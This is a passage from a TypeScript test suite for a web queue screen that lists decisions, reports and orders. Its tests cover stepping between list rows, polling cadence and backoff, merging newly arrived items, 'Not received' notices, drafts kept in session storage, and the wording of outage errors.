  for (const row of rows) test(row.name, () => assert.equal(call("getSelectedIdQ", groups, row.hashId), row.expected));

  // the neighbours are the list's rows that open on a sheet, in list order; an order's row is stepped over
  const stepItems = [buildItem({ id: 3 }), buildItem({ id: 5, kind: "report" }), buildItem({ id: 9, kind: "message", status: "answered", sendId: "s" }), buildItem({ id: 11, status: "answered", answer: { code: "R1", text: null } })];
  const stepRows = [
    { name: "the first sheet row has no previous", id: 3, lastIndex: -1, expected: { index: 0, count: 3, prevId: null, nextId: 5 } },
    { name: "stepping passes over an order's row both ways", id: 5, lastIndex: -1, expected: { index: 1, count: 3, prevId: 3, nextId: 11 } },
    { name: "the last sheet row has no next", id: 11, lastIndex: -1, expected: { index: 2, count: 3, prevId: 5, nextId: null } },
    { name: "an item gone from the list steps to the rows that stood beside it", id: 4, lastIndex: 1, expected: { index: -1, count: 3, prevId: 3, nextId: 5 } },
  ];
  for (const row of stepRows) test(`stepping: ${row.name}`, () => assert.deepEqual(call("getStepsQ", call("getGroupsQ", stepItems), row.id, row.lastIndex), row.expected));

  const presses = [
    { name: "an order to a session shows its entry in Orders", item: { kind: "message", status: "answered", sendId: "s" }, opens: 1 },
    { name: "an order written on a report shows its entry in Orders", item: { kind: "report", status: "answered", answer: { code: null, text: "ship it" } }, opens: 1 },
    { name: "an answered decision opens on the sheet", item: { status: "answered", answer: { code: "R1", text: null } }, opens: 0 },
    { name: "an open decision opens on the sheet", item: {}, opens: 0 },
  ];
  for (const row of presses) {
    test(`pressing a list row: ${row.name}`, () => {
      const calls: string[] = [];
      const listed = call<Array<{ rows: unknown[] }>>("getGroupsQ", [buildItem({ id: 7, ...row.item })]).flatMap((group) => group.rows)[0];
      const tree = render("QueueRowQ", { row: listed, isSelected: false, cols: ["tag", "fact"], view: { isNameShown: true, isAccountShown: false }, onSelect: () => calls.push("select"), onOrder: () => calls.push("order") });
      const [option] = findNodes(tree, (node) => node.props?.role === "option");
      (option?.props.onClick as () => void)();
      assert.deepEqual(calls, [row.opens ? "order" : "select"]);
    });
  }

  // spec §9.2 → Showing one order: the ticks only grow, by the order's session, when they leave every recipient out; nothing ticked shows every order
  const items = [buildItem({ id: 8, kind: "message", status: "answered", sendId: "s", session: buildSession({ id: "b2" }) }), buildItem({ id: 7, kind: "message", status: "delivered", sendId: "s" }), buildItem({ id: 9, kind: "message", status: "answered", sendId: "t", session: buildSession({ id: "c3" }) })];
  const shows = [
    { name: "nothing ticked stays so: the thread already holds every order", ids: [], copyId: 8, expected: [] },
    { name: "a ticked recipient keeps the ticks as they are", ids: ["c3", SESSION_ID], copyId: 8, expected: ["c3", SESSION_ID] },
    { name: "ticks that leave the order out gain the shown copy's session", ids: ["c3"], copyId: 8, expected: ["c3", "b2"] },
  ];
  for (const row of shows) test(`showing an order's entry: ${row.name}`, () => assert.deepEqual(call("getShowTicksQ", row.ids, items, row.copyId), row.expected));

  test("the thread entry an opened order aims at is the one holding any of its copies; one not loaded → none", () => {
    const entries = call<unknown[]>("getThreadEntriesQ", [buildItem({ id: 8, kind: "message", status: "answered", sendId: "s" }), buildItem({ id: 7, kind: "message", status: "answered", sendId: "s" })]);
    assert.deepEqual([call("getAimedEntryIdQ", entries, 8), call("getAimedEntryIdQ", entries, 40)], [7, null]);
  });
});

describe("what the sheet shows", () => {
  const held = buildItem({ id: 3 });
  const arrived = buildItem({ id: 2 });
  const answered = buildItem({ id: 3, status: "answered", answeredAt: "2026-11-12T12:20:00.000Z" });
  const rows = [
    { name: "an open item on the sheet that the read no longer holds stays on it as left the queue", items: [arrived], hashId: "3", expected: { kind: "left", id: 3 } },
    { name: "an opened item that is answered elsewhere stays on the sheet as left the queue", items: [arrived, answered], hashId: "3", expected: { kind: "left", id: 3 } },
    { name: "a held item still open keeps the sheet when a new row arrives before it", items: [arrived, held], hashId: "3", expected: { kind: "item", id: 3 } },
    { name: "a row the owner opened replaces the held item", items: [arrived], hashId: "2", expected: { kind: "item", id: 2 } },
    { name: "nothing in the hash leaves the held item off the sheet", items: [arrived, held], hashId: "", expected: { kind: "none", id: null } },
    // spec §4.3: the ticks change → the sheet gives way to the list once its item's session falls out of scope, never to the left-the-queue line
    { name: "a held item whose session the ticks leave out gives way to the list", items: [arrived], hashId: "3", ids: ["b2"], expected: { kind: "none", id: null } },
    { name: "a held item whose session stays ticked keeps the sheet", items: [arrived, held], hashId: "3", ids: [SESSION_ID], expected: { kind: "item", id: 3 } },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const sheet = call<{ kind: string; id: number }>("getSheetStateQ", call("getGroupsQ", row.items), row.hashId, { item: held, copies: [held] }, row.ids ?? []);
      assert.deepEqual({ kind: sheet.kind, id: sheet.id }, row.expected);
    });
  }

  test("an item that left the queue keeps its sheet, its foot one line and no composer", () => {
    const { queue } = buildQueue();
    const tree = render("QueueSheetQ", { queue: { ...withList(queue, [arrived]), sheet: { kind: "left", id: 3, item: held } } });
    const [foot] = byClass(tree, "card-foot");
    const [head] = findNodes(tree, (node) => node.type === "h2");
    assert.equal(collectText(head as RenderedNode).includes("Decision"), true, "the held item's letterhead");
    assert.equal(collectText(foot).replace(/\s+/g, " ").trim(), "ℹ This item left the queue.");
    assert.equal(findNodes(foot, (node) => node.type === "button" || node.type === "textarea").length, 0);
  });

  test("with no row opened yet, the first row holds the list's one tab stop and no row is current", () => {
    const queue = withList(buildQueue().queue, [answered, buildItem({ id: 9, kind: "message", status: "answered", sendId: "s-9" })]);
    const list = render("QueueListQ", { queue: { ...queue, selectedId: null } });
    const options = findNodes(list, (node) => node.props?.role === "option");
    assert.deepEqual([options.map((node) => node.props.tabIndex), options.map((node) => node.props["aria-selected"])], [[0, -1], [false, false]]);
  });

  test("with no item opened the sheet renders nothing", () => {
    const queue = withList(buildQueue().queue, [answered]);
    const tree = render("QueueSheetQ", { queue: { ...queue, sheet: { kind: "none", id: null } } });
    assert.deepEqual([byClass(tree, "queue-sheet").length, findNodes(tree, (node) => node.type === "h2").length], [0, 0]);
  });
});

describe("after the owner acts on the last open item", () => {
  const act = async (action: "answerItem" | "later") => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
    })) as ScreenModule;
    const selected: unknown[] = [];
    const actions = (module.useQueueActionsQ as (deps: unknown) => Record<string, (id: number, body?: unknown) => Promise<void>>)({
      groups: call("getGroupsQ", [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })]),
      setList: () => undefined,
      setDrafts: () => undefined,
      setStatus: () => undefined,
      openItem: (id: unknown) => selected.push(id),
      closeSheet: () => selected.push("list"),
      reload: () => undefined,
    });
    await actions[action]!(1, { code: "R1" });
    return selected;
  };

  test("an answer with nothing left open returns the list", async () => assert.deepEqual(await act("answerItem"), ["list"]));
  test("a later keeps the item selected, since it is still open", async () => assert.deepEqual(await act("later"), []));
});

describe("Show more", () => {
  test("Show more is the quiet small load-more button every screen uses", () => {
    const [button] = buttonLabelled(render("ShowMoreQ", { count: 100, isBusy: false, onMore: () => undefined }), "Show more");
    assert.equal(button?.props.className, "btn ghost sm");
  });

  // spec §12.5 in progress: the rest look, the -ing label, focus kept (no disabled), and a press reads nothing more
  const loads = [
    { name: "Show more", render: "ShowMoreQ", props: (onPress: () => void) => ({ count: 100, isBusy: true, onMore: onPress }) },
    { name: "Show earlier", render: "ShowEarlierQ", props: (onPress: () => void) => ({ isBusy: true, onShow: onPress }) },
  ];
  for (const row of loads) {
    test(`${row.name} in progress reads Loading…, stays focusable and starts no second read`, () => {
      let presses = 0;
      const [button] = buttonLabelled(render(row.render, row.props(() => { presses += 1; })), "Loading…");
      (button?.props.onClick as (() => void) | undefined)?.();
      assert.deepEqual([button?.props["aria-busy"], button?.props.disabled, presses], [true, undefined, 0]);
    });
  }

  test("the next page after the cursor joins the loaded list in queue order", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ items: [buildItem({ id: 3 })], nextCursor: null }) };
      },
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "ready", data: { items: [buildItem({ id: 1 }), buildItem({ id: 2 })], nextCursor: 12 } };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getMoreQ as (deps: unknown) => Promise<void>)({ list, setList });
    const data = getPlain(list.data) as { items: Array<{ id: number }>; nextCursor: number | null };
    assert.match(urls[0] ?? "", /[?&]after=12(&|$)/);
    assert.deepEqual(data.items.map((item) => item.id), [1, 2, 3]);
    assert.equal(data.nextCursor, null);
  });
});

describe("list read", () => {
  const read = async (status: number, body: unknown) => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async () => ({ status, json: async () => body }),
    })) as ScreenModule;
    let list: Record<string, unknown> = { status: "idle", data: null, error: null };
    const setList = (next: unknown) => {
      list = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(list) : (next as Record<string, unknown>);
    };
    await (module.getListQ as (deps: unknown) => Promise<void>)({ setList });
    return list;
  };

  test("an answer carrying the item list is ready", async () => {
    assert.equal((await read(200, { items: [], nextCursor: null })).status, "ready");
  });

  test("a 2xx answer without an item list is a read failure, never a list to render", async () => {
    const list = await read(200, { rows: [] });
    assert.equal(list.status, "error");
    assert.equal(list.data, null);
  });

  // no sign-in state to hand a refusal to → every refused read is a failure with Retry
  const refusals = [
    { name: "a 503 database outage is a read failure with Retry", status: 503, body: { error: "database_unavailable" }, expected: "error" },
    { name: "a 503 with any other code is a read failure with Retry", status: 503, body: { error: "not_provisioned" }, expected: "error" },
    { name: "a 401 is a read failure with Retry", status: 401, body: { error: "unauthorized" }, expected: "error" },
  ];
  for (const row of refusals) test(row.name, async () => assert.equal((await read(row.status, row.body)).status, row.expected));
});

describe("the page re-reads itself", () => {
  const cadence = [
    { name: "a good read keeps the 15 s step", fails: 0, expected: 15_000 },
    { name: "two failed reads in a row keep the 15 s step", fails: 2, expected: 15_000 },
    { name: "three failed reads in a row slow it to 60 s", fails: 3, expected: 60_000 },
    { name: "more failed reads stay at 60 s", fails: 7, expected: 60_000 },
  ];
  for (const row of cadence) test(`cadence: ${row.name}`, () => assert.equal(call("getPollDelayQ", row.fails), row.expected));

  const stale = [
    { name: "a tab shown again reads at once when its last read is older than 15 s", age: 15_001, expected: true },
    { name: "a tab shown again within 15 s of its last read waits for its timer", age: 14_999, expected: false },
  ];
  for (const row of stale) test(row.name, () => assert.equal(call("isReadStaleQ", 1_000_000, 1_000_000 + row.age), row.expected));

  // the server takes up to 200 per read → a list extended by Show more is read whole up to that cap
  const limits = [
    { name: "a first page reads the page size", loaded: 0, expected: 100 },
    { name: "a list extended by Show more reads every loaded row", loaded: 150, expected: 150 },
    { name: "a list past the server's cap reads the cap", loaded: 350, expected: 200 },
  ];
  for (const row of limits) test(`read size: ${row.name}`, () => assert.equal(call("getReadLimitQ", row.loaded, ...vm.runInContext("[LIST_Q.LIMIT, LIST_Q.MAX]", screen)), row.expected));

  const merge = (prevItems: unknown[] | null, answerItems: unknown[], nextCursor: number | null = null, prevCursor: number | null = null) =>
    call<{ data: { items: Array<{ id: number; status: string }>; nextCursor: number | null }; arrived: Array<{ id: number }>; turned: Array<{ id: number }> }>(
      "getMergedDataQ", prevItems === null ? null : { items: prevItems, nextCursor: prevCursor }, { items: answerItems, nextCursor });

  test("a known row takes the read's state, a gone row leaves, and a new decision or report arrives", () => {
    const { data, arrived } = merge(
      [buildItem({ id: 1 }), buildItem({ id: 2 })],
      [buildItem({ id: 1, status: "answered" }), buildItem({ id: 3, kind: "report" }), buildItem({ id: 4 })],
    );
    assert.deepEqual(data.items.map((item) => [item.id, item.status]), [[1, "answered"], [3, "open"], [4, "open"]]);
    assert.deepEqual(arrived.map((item) => item.id), [3, 4]);
  });

  test("the owner's own new order and the first read of the page are no arrivals", () => {
    assert.deepEqual(merge([buildItem({ id: 1 })], [buildItem({ id: 1 }), buildItem({ id: 5, kind: "message", status: "answered" })]).arrived, []);
    assert.deepEqual(merge(null, [buildItem({ id: 1 })]).arrived, []);
  });

  test("rows loaded past the read's last position stay, with their cursor, until a read reaches them", () => {
    const loaded = [buildItem({ id: 1, queuePosition: 1 }), buildItem({ id: 2, queuePosition: 2 }), buildItem({ id: 9, queuePosition: 9 })];
    const { data } = merge(loaded, [buildItem({ id: 1, queuePosition: 1 }), buildItem({ id: 3, queuePosition: 3 })], 3, 9);
    assert.deepEqual(data.items.map((item) => item.id), [1, 3, 9]);
    assert.equal(data.nextCursor, 9);
  });

  const readOnce = async (list: Record<string, unknown>, status: number, body: unknown) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: uiStub() }, fetch: async () => ({ status, json: async () => body }) })) as ScreenModule;
    let current = list;
    const setList = (next: unknown) => {
      current = typeof next === "function" ? (next as (prev: unknown) => Record<string, unknown>)(current) : (next as Record<string, unknown>);
    };
    const result = await (module.getListQ as (deps: unknown) => Promise<{ isGood: boolean; arrived: Array<{ id: number }> }>)({ setList, getList: () => current });
    return { list: getPlain(current) as Record<string, unknown> & { data: { items: Array<{ id: number }> } | null; newIds: number[] }, result: getPlain(result) };
  };
  const loadedList = (overrides: Record<string, unknown> = {}) =>
    ({ status: "ready", data: { items: [buildItem({ id: 1 })], nextCursor: null }, error: null, readAt: "2026-11-13T03:10:00.000Z", newIds: [], ...overrides });

  test("a failed read with rows loaded keeps every row and its last read time, and says the read failed", async () => {
    const { list, result } = await readOnce(loadedList(), 503, { error: "database_unavailable" });
    assert.deepEqual(list.data?.items.map((item) => item.id), [1]);
    assert.equal(list.status, "ready");
    assert.equal(list.readAt, "2026-11-13T03:10:00.000Z");
    assert.notEqual(list.error, null);
    assert.equal(result.isGood, false);
  });

  test("a good read after a failed one clears the failure", async () => {
    const { list, result } = await readOnce(loadedList({ error: { sentence: "x" } }), 200, { items: [buildItem({ id: 1 })], nextCursor: null });
    assert.equal(list.error, null);
    assert.equal(result.isGood, true);
  });

  test("an arrival is tracked and reported", async () => {
    const answer = { items: [buildItem({ id: 1 }), buildItem({ id: 6 })], nextCursor: null };
    const marked = await readOnce(loadedList({ newIds: [1] }), 200, answer);
    assert.deepEqual(marked.list.newIds, [1, 6]);
    assert.deepEqual(marked.result.arrived.map((item) => item.id), [6]);
  });

  test("an arrival stops being tracked when a read no longer has its row", async () => {
    const { list } = await readOnce(loadedList({ newIds: [1] }), 200, { items: [buildItem({ id: 2 })], nextCursor: null });
    assert.deepEqual(list.newIds, [2]);
  });

  const notes = [
    { name: "one arrival names its kind, its session and its title", arrived: [buildItem({ session: buildSession({ name: "yoaida" }) })], expected: "New decision from yoaida: Pick the migration order" },
    { name: "a report names itself a report", arrived: [buildItem({ kind: "report", title: "Nightly sweep done", session: buildSession({ name: "yoaida" }) })], expected: "New report from yoaida: Nightly sweep done" },
    { name: "several arrivals are counted", arrived: [buildItem({ id: 1 }), buildItem({ id: 2 }), buildItem({ id: 3 })], expected: "3 new items" },
  ];
  for (const row of notes) test(`arrival note: ${row.name}`, () => assert.equal(call("getArrivalNoteQ", row.arrived), row.expected));

  // a turn to Not received is said once, on the read that sees it; a turn to Received and a copy first seen already failed are silent
  test("a read reports the copies whose receipt turned to Not received since the last read", () => {
    const order = (id: number, status: string, canResend = false) => buildItem({ id, kind: "message", status, canResend });
    const { turned } = merge(
      [order(1, "answered"), order(2, "delivering"), order(3, "unacked", true), order(4, "answered")],
      [order(1, "unacked", true), order(2, "delivered"), order(3, "unacked", true), order(4, "expired"), order(5, "expired")],
    );
    assert.deepEqual(turned.map((item) => item.id), [1, 4]);
  });

  const turns = [
    { name: "one recipient names its session", turned: [buildItem({ id: 1, kind: "message", status: "unacked", session: buildSession({ name: "yoaida" }) })], expected: "⚠ yoaida has not received an order" },
    {
      name: "recipients in several sessions are named together",
      turned: [
        buildItem({ id: 1, kind: "message", status: "unacked", session: buildSession({ name: "yoaida" }) }),
        buildItem({ id: 2, kind: "message", status: "expired", session: buildSession({ id: "0d3e7a51-2c4f-4b8e-9f61-7a2b5c8d1e30", name: "gersona" }) }),
      ],
      expected: "⚠ yoaida and gersona have not received an order",
    },
    { name: "an answer to a decision is named an answer", turned: [buildItem({ id: 1, status: "unacked", session: buildSession({ name: "yoaida" }) })], expected: "⚠ yoaida has not received an answer" },
  ];
  for (const row of turns) test(`Not received note: ${row.name}`, () => assert.equal(call("getNotReceivedNoteQ", row.turned), row.expected));

  // the list body spans 180–820 on screen; rows are 68 high (spec §4.2)
  const listBody = { top: 180, bottom: 820 };
  const rowAt = (id: number, top: number) => ({ id, top, bottom: top + 68 });
  const offViews = [
    { name: "an arrival's row inside the visible part needs no note", rows: [rowAt(7, 400)], expected: null },
    { name: "an arrival's row cut by an edge still shows, so needs no note", rows: [rowAt(7, 790)], expected: null },
    { name: "an arrival's row under the visible part is one new below", rows: [rowAt(7, 820)], expected: { count: 1, direction: "below", id: 7 } },
    { name: "arrivals' rows over the visible part are counted, and Show goes to the nearest", rows: [rowAt(3, -200), rowAt(4, 112)], expected: { count: 2, direction: "above", id: 4 } },
    { name: "arrivals' rows on both sides name the side below, nearest first", rows: [rowAt(3, 40), rowAt(9, 1200), rowAt(8, 900)], expected: { count: 2, direction: "below", id: 8 } },
    { name: "a list put away by an open sheet has no visible part to leave", body: { top: 0, bottom: 0 }, rows: [rowAt(7, 0)], expected: null },
  ];
  for (const row of offViews) test(`off-view note: ${row.name}`, () => assert.deepEqual(call("getOffViewQ", row.body ?? listBody, row.rows), row.expected));

  // spec §4.4: an arrival is tracked until its row has been in the shown list's visible part
  const seen = [
    { name: "a row inside the visible part has been seen", rows: [rowAt(7, 400)], expected: [7] },
    { name: "a row cut by an edge shows, so has been seen", rows: [rowAt(7, 790), rowAt(8, 140)], expected: [7, 8] },
    { name: "a row wholly past an edge has not been seen", rows: [rowAt(7, 820), rowAt(8, 112)], expected: [] },
    { name: "a list put away by an open sheet shows no row", body: { top: 0, bottom: 0 }, rows: [rowAt(7, 0)], expected: [] },
  ];
  for (const row of seen) test(`arrival seen: ${row.name}`, () => assert.deepEqual(call("getInViewIdsQ", row.body ?? listBody, row.rows), row.expected));

  test("the off-view note says how many arrivals sit on which side, and its Show moves to the nearest", () => {
    const shown: number[] = [];
    const queue = { ...withList(buildQueue(), [buildItem()]), status: "New report from yoaida: Nightly sweep done" };
    const tree = render("ListFootQ", { queue, offView: { count: 1, direction: "below", id: 7 }, onShowNew: (id: number) => shown.push(id) });
    assert.match(collectText(tree).replace(/\s+/g, " "), /^New report from yoaida: Nightly sweep done 1 new below Show$/);
    for (const button of buttonLabelled(tree, "Show")) (button.props.onClick as () => void)();
    assert.deepEqual(shown, [7]);
  });

  const footRows = [
    { name: "a line naming an order carries Show, which opens the order view at that order", status: { text: "⚠ yoaida has not received an order", orderId: 7 }, opened: [7] },
    { name: "a plain line carries no Show", status: "Marked as read", opened: [] },
  ];
  for (const row of footRows) {
    test(`list status line: ${row.name}`, () => {
      const opened: number[] = [];
      const queue = { ...withList(buildQueue(), [buildItem()]), status: row.status, openOrderRow: (target: { id: number }) => opened.push(target.id) };
      const tree = render("ListFootQ", { queue });
      const [line] = findNodes(tree, (node) => node.props?.role === "status");
      assert.equal(collectText(line as RenderedNode), typeof row.status === "string" ? row.status : row.status.text);
      for (const button of buttonLabelled(tree, "Show")) (button.props.onClick as () => void)();
      assert.deepEqual(opened, row.opened);
    });
  }

  test("a read asked for while one is in flight joins it; a fresh one runs after it", async () => {
    const flight = { current: null as Promise<unknown> | null };
    const started: string[] = [];
    const start = (label: string) => () => { started.push(label); return Promise.resolve(label); };
    const join = screen.getJoinedReadQ as (flight: unknown, start: () => Promise<unknown>, isFresh?: boolean) => Promise<unknown>;
    const first = join(flight, start("action"), true);
    const joined = join(flight, start("tick"));
    const fresh = join(flight, start("next action"), true);
    assert.deepEqual(await Promise.all([first, joined, fresh]), ["action", "action", "next action"]);
    assert.deepEqual(started, ["action", "next action"]);
    assert.equal(flight.current, null);
  });

  test("each tick schedules the next once it settles: three failures in a row slow the chain, a good read restores the step", async () => {
    const delays: number[] = [];
    let due: (() => Promise<void>) | null = null;
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      setTimeout: (run: () => Promise<void>, ms: number) => { delays.push(ms); due = run; return delays.length; },
      clearTimeout: () => undefined,
    })) as ScreenModule;
    const answers = [false, false, false, true];
    const settled: number[] = [];
    (module.createReadClockQ as (tick: () => Promise<boolean | undefined>, onSettle: (fails: number) => void) => unknown)(async () => answers.shift(), (fails) => settled.push(fails));
    for (let index = 0; index < 4; index += 1) await (due as unknown as () => Promise<void>)();
    assert.deepEqual(delays, [15_000, 15_000, 15_000, 60_000, 15_000]);
    assert.deepEqual(settled, [1, 2, 3, 0], "the failures in a row the header line words its interval from");
  });

  test("a tick that throws counts as a failed read and still schedules the next one, which runs", async () => {
    const delays: number[] = [];
    let due: (() => Promise<void>) | null = null;
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      setTimeout: (run: () => Promise<void>, ms: number) => { delays.push(ms); due = run; return delays.length; },
      clearTimeout: () => undefined,
    })) as ScreenModule;
    const ticks: string[] = [];
    const answers: Array<() => boolean> = [
      () => { ticks.push("throws"); throw new Error("read failed"); },
      () => { ticks.push("throws"); throw new Error("read failed"); },
      () => { ticks.push("throws"); throw new Error("read failed"); },
      () => { ticks.push("lands"); return true; },
    ];
    (module.createReadClockQ as (tick: () => Promise<boolean | undefined>) => unknown)(async () => (answers.shift() as () => boolean)());
    for (let index = 0; index < 4; index += 1) await (due as unknown as () => Promise<void>)().catch(() => undefined);
    assert.deepEqual(ticks, ["throws", "throws", "throws", "lands"]);
    assert.deepEqual(delays, [15_000, 15_000, 15_000, 60_000, 15_000]);
  });

});

describe("drafts kept in session storage", () => {
  // a Map-backed sessionStorage; `failing` makes every call throw as a full or blocked store does
  const buildStorage = (seed: Record<string, string> = {}, failing = false) => {
    const values = new Map(Object.entries(seed));
    const guard = () => { if (failing) throw new Error("QuotaExceededError"); };
    return {
      values,
      getItem: (key: string) => { guard(); return values.get(key) ?? null; },
      setItem: (key: string, value: string) => { guard(); values.set(key, String(value)); },
    };
  };
  const storedShot = { key: "shot-3", id: "9b2f4c1e-7a10-4d3b-8e5f-2c6a1d0b9e47", name: "Pasted image 1.png", bytes: 482_311, status: "stored", src: "/api/queue/owner/images/9b2f4c1e-7a10-4d3b-8e5f-2c6a1d0b9e47", cause: null };

  test("a kept draft holds the picked option, the text and the images the server stores; nothing a reload cannot resume", () => {
    const draft = {
      code: "B",
      text: "Run the shadow migration first",
      error: "✕ Write an order",
      isWaiting: true,
      images: [
        { ...storedShot, file: { size: 482_311 } },
        { key: "shot-4", id: null, name: "Pasted image 2.png", bytes: 120_004, status: "uploading", src: "blob:http://127.0.0.1:16145/1f0e", cause: null },
        { key: "shot-5", id: null, name: "diagram.webp", bytes: 98_101, status: "failed", src: "blob:http://127.0.0.1:16145/2a7c", cause: "outage" },
      ],
    };
    assert.deepEqual(call("getKeptDraftQ", draft), { code: "B", text: "Run the shadow migration first", images: [storedShot] });
  });

  test("an item whose kept draft is empty leaves the store", () => {
    const drafts = { 41: { text: "", images: [], error: null }, 42: { text: "Ship it" }, 43: undefined };
    assert.deepEqual(call("getKeptDraftsQ", drafts), { 42: { text: "Ship it", images: [] } });
  });

  test("what is set in the store is what a reload gets back", () => {
    const storage = buildStorage();
    const drafts = { 42: { code: "A", text: "Ship it", images: [storedShot] } };
    (screen.setStoredQ as (storage: unknown, key: string, value: unknown) => void)(storage, "queue.drafts", drafts);
    assert.deepEqual(getPlain((screen.getStoredQ as (storage: unknown, key: string, fallback: unknown) => unknown)(storage, "queue.drafts", {})), drafts);
  });

  const unreadable = [
    { name: "nothing stored yet", storage: buildStorage() },
    { name: "a value that is not JSON", storage: buildStorage({ "queue.drafts": "{not json" }) },
    { name: "a store that refuses to be read", storage: buildStorage({ "queue.drafts": "{}" }, true) },
    { name: "no store at all", storage: undefined },
  ];
  for (const row of unreadable) {
    test(`a store that cannot give a draft back gives the empty value: ${row.name}`, () => {
      assert.deepEqual(getPlain((screen.getStoredQ as (storage: unknown, key: string, fallback: unknown) => unknown)(row.storage, "queue.drafts", {})), {});
    });
  }
});

describe("one outage reads one way across the page", () => {
  const outages = [
    { name: "no answer at all", answer: { status: 0, data: null, error: new TypeError("Failed to fetch") } },
    { name: "a database outage", answer: { status: 503, data: { error: "database_unavailable" } } },
    { name: "an unknown server error", answer: { status: 500, data: { error: "queue_environment_failure" } } },
  ];
  const others = [
    { name: "an unknown refusal", answer: { status: 415, data: null } },
    { name: "a 2xx answer without the expected list", answer: { status: 200, data: { rows: [] } } },
  ];
  type Answer = { status: number; data: unknown; error?: Error };
  const fetchFor = (answer: Answer) => async () => {
    if (answer.status === 0) throw answer.error;
    return { status: answer.status, json: async () => answer.data };
  };
  const getCard = (answer: Answer) => {
    const failure = call<{ sentence: string; next: string; detail: string }>("getReadFailureQ", answer);
    const [card] = findNodes(render("QueueFailureQ", { failure, onRetry: () => undefined }), (node) => node.props?.atom === "AlertCard");
    return { failure, card };
  };
  const getRegionText = async (answer: Answer) => {
    const module = (await loadScreenModule(QUEUE_SRC, { window: { UI: realUi }, fetch: fetchFor(answer) })) as ScreenModule;
    let region = realUi.INITIAL_REGION_STATE as { error: unknown };
    const setResumes = (next: (prev: unknown) => typeof region) => { region = next(region); };
    await (module.getResumesQ as (deps: unknown) => Promise<void>)({ setResumes });
    const element = realUiReact.createElement(realUi.RegionUnavailable, { source: "recent automatic resumes", error: region.error });
    return collectText(renderScreen(element) as RenderedNode);
  };

  for (const row of [...outages, ...others]) {
    test(`the list card gives the resume region's next step, the raw answer behind Details: ${row.name}`, async () => {
      const { failure, card } = getCard(row.answer);
      const regionText = await getRegionText(row.answer);
      assert.ok(regionText.includes(String(card?.props.body)), `card "${card?.props.body}" | region "${regionText}"`);
      assert.doesNotMatch(`${card?.props.title} ${card?.props.body}`, /HTTP|\d{3}|_/);
      assert.equal(card?.props.details, failure.detail);
    });
  }

  for (const row of outages) {
    test(`an owner action on the same outage gives the card's next step: ${row.name}`, () => {
      const { failure } = getCard(row.answer);
      assert.equal(call("getActionErrorQ", row.answer), failure.next);
    });
  }

  // action lines carry no Details → an unanswered request in any browser wording reads as the server not answering
  test("an owner action on an unanswered request in unrecognised browser wording names the server, never Details", () => {
    const answer = { status: 0, data: null, error: new TypeError("The network connection was lost.") };
    const { next } = getCard(outages[0].answer).failure;
    const line = call<string>("getActionErrorQ", answer);
    assert.equal(line, next);
    assert.doesNotMatch(line, /Details/);
  });

  test("a database outage names the database on the card and in the region", async () => {
    const answer = { status: 503, data: { error: "database_unavailable" } };
    assert.match(String(getCard(answer).card?.props.body), /database/);
    assert.match(await getRegionText(answer), /database/);
  });

});

describe("page header freshness", () => {
  const readAt = () => new Date().toISOString();
  const list = (overrides: Record<string, unknown> = {}) => ({ status: "ready", data: { items: [] }, error: null, readAt: readAt(), ...overrides });
  const resumes = (overrides: Record<string, unknown> = {}) => ({ ...READY_RESUMES, ...overrides });
  const getHeader = (queue: Record<string, unknown>) => {
    const [header] = findNodes(render("QueueHeaderQ", { queue: { reload: () => undefined, sessions: buildSessions(), ...queue } }), (node) => node.props?.atom === "PageHeader");
    const freshness = header?.props.freshness as { props: Record<string, unknown> };
    const line = renderScreen(freshness) as RenderedNode;
    const stamp = collectText(line).replace(/\s+/g, " ");
    const regions = findNodes(line, (node) => node.props?.role === "status");
    return { stamp, header, regions: regions.map((node) => [collectText(node).replace(/\s+/g, " "), node.props.title]) };
  };

  // the freshness slot holds the page's own cadence; only a failed list read with rows on screen replaces it
  const rows = [
    { name: "a failed resume re-read leaves the header on the page's cadence", queue: { list: list(), resumes: resumes({ data: [], error: "HTTP 503 database_unavailable" }) }, stamp: /^Checks every 15s$/ },
    { name: "a failed list read with rows loaded says the page is not updated, when it last read and when it tries again", queue: { list: list({ data: { items: [] }, readAt: "2026-11-13T12:29:00.000Z", error: { detail: "HTTP 500" } }), resumes: resumes(), failedChecks: 1 }, stamp: /^⚠ Not updated · last read 21:29 · trying again every 15s$/ },
    { name: "three failed checks in a row say the slower step", queue: { list: list({ data: { items: [] }, readAt: "2026-11-13T12:29:00.000Z", error: { detail: "HTTP 500" } }), resumes: resumes(), failedChecks: 3 }, stamp: /^⚠ Not updated · last read 21:29 · trying again every 60s$/ },
    { name: "both reads landed shows the page's cadence", queue: { list: list(), resumes: resumes() }, stamp: /^Checks every 15s$/ },
  ];
  for (const row of rows) {
    test(row.name, () => {
      assert.match(getHeader(row.queue).stamp.trim(), row.stamp);
    });
  }

  // spec §3.1: the page checks by itself on its own cadence (POLL_Q) and after each owner act → a manual read has nothing to add
  test("the header holds the status line and no Refresh, a read in flight included", () => {
    const { header } = getHeader({ list: list({ status: "loading" }), resumes: resumes({ busy: true }) });
    assert.deepEqual([header?.props.freshness === undefined, header?.props.refresh, header?.props.actions, header?.props.primary], [false, undefined, undefined, undefined]);
  });

  // spec §3.1: one status region in both forms, so a turn to failed and back is said once; its title carries the last read
  const lines = [
    { name: "the cadence line", list: list({ readAt: "2026-11-13T12:30:15.000Z" }) },
    { name: "the failed-check line", list: list({ readAt: "2026-11-13T12:30:15.000Z", error: { detail: "HTTP 500" } }) },
  ];
  for (const row of lines) {
    test(`${row.name} is a status region whose title names the last read`, () => {
      const { stamp, regions } = getHeader({ list: row.list, resumes: resumes(), failedChecks: 1 });
